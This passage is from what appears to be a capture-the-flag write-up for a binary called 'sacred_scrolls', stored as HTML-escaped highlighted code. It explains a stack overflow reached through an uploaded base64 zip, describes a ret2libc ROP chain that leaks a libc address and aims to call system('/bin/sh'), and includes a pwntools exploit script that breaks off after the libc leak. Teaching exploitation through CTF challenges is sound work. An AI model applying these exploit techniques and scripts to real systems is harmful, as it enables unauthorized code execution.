&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; local_10))) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         ((&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; local_10) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Z&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; local_10))))) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (((&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; local_10) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;9&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; local_10))) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; local_10) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)))) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; local_10) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;)) &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    local_10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; local_10 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s[-] File contains invalid charcter: [%c]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;DAT_004020af,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         (ulong)(uint)(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;local_228 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; local_10));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#75715e&#34;&gt;/* WARNING: Subroutine does not return */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that &lt;code&gt;spell_upload&lt;/code&gt; seems to construct a string with the buffer it reads and then passes it to &lt;code&gt;system&lt;/code&gt;. By looking at the values of the constants being used to construct the string using the &lt;code&gt;xxd&lt;/code&gt; command (eg &lt;code&gt;echo 27206f686365 | xxd -r -p | rev&lt;/code&gt;), we can see that the string constructed is &lt;code&gt;echo &#39;buffer&#39; | base 64 -d &amp;gt; spell.zip&lt;/code&gt;. So we now clearly know how we can overflow and control the execution of the program. We just have to upload the base64 of a zip file containing a &lt;code&gt;spell.txt&lt;/code&gt; file containing the following payload : &lt;code&gt;magic_bytes + padding + overflow&lt;/code&gt;, then read it and then leave the program to trigger the overflow.&lt;/p&gt;
&lt;h3 id=&#34;the-exploit&#34;&gt;The exploit&lt;/h3&gt;
&lt;p&gt;Now that put all the pieces together, we still have to figure out what to do with the overflow. We can try to attempt a ret2libc to call &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;. Since it is a 64-bits binary, we cannot just pass arguments by getting them on the stack, we have to put them in the &lt;code&gt;rdi&lt;/code&gt; register. We will use a bit of ROP (Return Oriented Programming) to do that.&lt;/p&gt;
&lt;h5 id=&#34;short-explanation-of-rop&#34;&gt;Short explanation of ROP&lt;/h5&gt;
&lt;p&gt;Shortly, ROP is a technique that uses small chunks of code placed before a &lt;code&gt;ret&lt;/code&gt; instruction called &amp;ldquo;gadgets&amp;rdquo;. What the &lt;code&gt;ret&lt;/code&gt; instruction actually does is popping the value on top of the stack and putting it in &lt;code&gt;rip&lt;/code&gt; to redirect the execution on it. This is how the processor keeps track of the execution and is able to return to the right place after the execution of a function. Since we control the top of the stack, we can chain gadgets that will be executed since they end with &lt;code&gt;ret&lt;/code&gt; which will pop the next stack value.&lt;/p&gt;
&lt;h5 id=&#34;the-construction-of-the-rop-chain&#34;&gt;The construction of the ROP chain&lt;/h5&gt;
&lt;p&gt;The first and essential gadget we need to find is a &lt;code&gt;pop rdi; ret&lt;/code&gt;. so that we can control the value of &lt;code&gt;rdi&lt;/code&gt; and pass it to &lt;code&gt;system&lt;/code&gt;. The issue is that we actually do not have any gadget of that sort in the binary. That is very inconvenient, without a way to control &lt;code&gt;rdi&lt;/code&gt;, we cannot control what we pass to functions. There is definitely a &lt;code&gt;pop rdi&lt;/code&gt; gadget in the libc but we cannot know its address because of ASLR. Each time we launched the program, the libc is mapped in a different place of the memory and we have to get its address at runtime. A good way to do that by calling &lt;code&gt;puts&lt;/code&gt; which is used by the binary with a libc function as an argument so that puts will print its address and then we can call the &lt;code&gt;main&lt;/code&gt; function whose address we know to so the same exploit but knowing the libc address this time. The problem with that is that we have no way to control the registers we pass to &lt;code&gt;puts&lt;/code&gt; or any function. We will check the state of our registers at the time of the overflow to see if there is anything interesting. By opening &lt;code&gt;gdb&lt;/code&gt; and placing a breakpoint before the &lt;code&gt;ret&lt;/code&gt; instruction of &lt;code&gt;spell_save&lt;/code&gt; we obtain that :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/sacred_scrolls_regs.png&#34; alt=&#34;regs&#34;&gt;&lt;/p&gt;
&lt;p&gt;Luckily, thanks to a weird magic, after we return from our call to &lt;code&gt;printf&lt;/code&gt;, there is an artifact of its stack frame in &lt;code&gt;rdi&lt;/code&gt; which is a pointer to the &lt;code&gt;funclockfile&lt;/code&gt; function. Now, we have everything we need to get our flag. We can craft two payload : The first one will be the PLT address of &lt;code&gt;puts&lt;/code&gt; so that it displays the address of &lt;code&gt;funlockfile&lt;/code&gt; followed by the &lt;code&gt;main&lt;/code&gt; function address to relaunch the program. Once we have done this, we can compute the base address of the libc and create a second one with our ret2libc by chaining the &lt;code&gt;pop rdi&lt;/code&gt; gadget, a &lt;code&gt;/bin/sh&lt;/code&gt; address found in the libc and finally the &lt;code&gt;system&lt;/code&gt; function address. Tiny issue : &lt;code&gt;system&lt;/code&gt; requires the stack to be well-aligned so before calling it, we have to put a simple &lt;code&gt;ret&lt;/code&gt; in our ROP chain.&lt;/p&gt;
&lt;p&gt;Here is the script that does all of that using the &lt;code&gt;pwntools&lt;/code&gt; python library :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gen_payload&lt;/span&gt;(payload):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rm -f ./spell.txt&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rm -f ./spell.zip&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./spell.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; stream:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        stream&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;zip ./spell.zip ./spell.txt&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./spell.zip&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64encode(data)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rm -f ./spell.txt&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rm -f ./spell.zip&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; payload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;send_payload&lt;/span&gt;(io, payload):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tag: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_libc&lt;/span&gt;(leak):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    libc_funlockfile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unpack(leak&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    libc_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_funlockfile &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;funlockfile
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; libc_address
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;binname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./sacred_scrolls&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binname
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./glibc/libc.so.6&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(binname)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;magic_mark &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xf0\x9f\x91\x93\xe2\x9a\xa1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binary&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;puts
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;main &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binary&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;spell &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; magic_mark &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; padding &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pack(puts) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pack(main)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gen_payload(spell)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# io = process(binname)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;XXX.XXX.XXX.XXX&amp;#39;&lt;/span&gt;, XXXX)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;send_payload(io, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_libc(leak)
